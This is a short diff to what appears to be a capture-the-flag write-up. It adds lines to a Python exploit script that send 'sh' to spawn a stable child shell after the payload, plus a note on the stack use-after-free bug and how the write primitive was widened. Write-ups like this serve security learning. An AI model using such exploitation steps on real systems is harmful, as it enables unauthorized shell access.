@@ -320,6 +320,10 @@ def exploit(p):
     buf += b';' * (MY_READ_COUNT - len(buf))
     p.sendline(buf)
 
+    # For some reason, the spawned shell isn't stable. 
+    # Pop a clean child shell!
+    p.sendline(b'sh')
+
 
 def main():
     if IS_DEBUG:
@@ -338,3 +342,7 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+This challenge was pretty cool - both the vulnerability (stack-UAF) and the exploitation.
+It was nice increasing the write primitive from being very limited, to absolute linear write. 
+Also, I've used a cool trick, to pop a child-shell in case the produced shell runs within corrupted environment - which have made the exploit more stable. 
